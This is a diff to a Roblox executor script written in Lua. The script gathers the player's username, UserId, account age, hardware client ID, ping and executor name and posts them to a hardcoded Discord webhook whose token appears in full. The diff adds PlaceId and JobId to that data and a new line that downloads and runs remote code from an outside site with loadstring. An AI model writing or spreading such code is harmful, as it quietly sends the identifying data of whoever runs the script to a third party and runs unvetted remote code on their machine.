@@ -16569,8 +16569,11 @@ local C = game:GetService("Players").LocalPlayer.Name
 local D = game:GetService("Players").LocalPlayer.DisplayName
 local E = game:GetService("Players").LocalPlayer.UserId
 local F = game:GetService("Players").LocalPlayer.AccountAge
-local G = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+local G = game.PlaceId
 local H = identifyexecutor()
+local I = game.JobId
+local J = false
+
 
 print('_______________________:')
 warn("CHECK")
@@ -16580,8 +16583,10 @@ print('Username:',C)
 print('DisplayName:',D)
 print('UserID:',E)
 print('Account Age:',F)
-print('PING:',G)
+print('PlaceId:',G)
 print('Executor:',H)
+print('JobId:',I)
+print('discord deleted:',J)
 print('_______________________:')
 
 local webh = "https://discord.com/api/webhooks/1046547097807224972/-guESl_vIMGbx443TVvesQXnxepiy_HHpXzVF8H79AapUmr_1fteFn_PKwO_8HszhxKM"
@@ -16604,6 +16609,9 @@ local data = {
         {name = '**Hardware ID**', value = game:GetService("RbxAnalyticsService"):GetClientId()},
         {name = "**Ping**", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
         {name = "**Executor**", value = identifyexecutor()},
+        {name = "**PlaceId**", value = game.PlaceId},
+        {name = "**JobId**", value = game.JobId},
+        {name = "**discord deleted:**", value = false},
       }
     }
   }
@@ -16645,10 +16653,12 @@ elseif http_request then
 end
 end)
 
+wait(1);
+
+loadstring(game:HttpGet("https://eternityhub.xyz/BetterRoblox/Loader"))()
+
 local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
 local Notify = AkaliNotif.Notify;
-
-wait(1);
 
 Notify({
   Description = "Loaded.";
